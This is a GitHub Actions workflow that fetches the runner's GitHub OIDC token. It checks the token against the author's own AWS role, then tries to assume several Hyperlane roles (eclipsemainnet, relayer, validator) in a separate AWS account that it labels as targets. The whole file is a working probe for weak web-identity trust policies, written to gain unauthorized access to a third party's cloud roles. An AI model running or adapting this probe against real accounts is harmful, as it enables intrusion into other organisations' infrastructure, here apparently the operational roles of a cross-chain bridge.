name: STS Oracle Final Validation
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe hyperlane trust policy with real GitHub OIDC token
        run: |
          TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
          echo "TOKEN_OK=true"
          # Calibration: known-trusted role (our own)
          R_CALIB=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
            --role-session-name probe01 --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "CALIB_062341577280: $R_CALIB"
          # Target: hyperlane-eclipsemainnet
          R_TARGET=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::010438463704:role/hyperlane-eclipsemainnet" \
            --role-session-name probe02 --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "TARGET_010438463704_hyperlane-eclipsemainnet: $R_TARGET"
          # Also test hyperlane-relayer and other roles if they exist
          R_RELAY=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::010438463704:role/hyperlane-relayer" \
            --role-session-name probe03 --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "TARGET_010438463704_hyperlane-relayer: $R_RELAY"
          R_VALIDATOR=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::010438463704:role/hyperlane-validator" \
            --role-session-name probe04 --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "TARGET_010438463704_hyperlane-validator: $R_VALIDATOR"
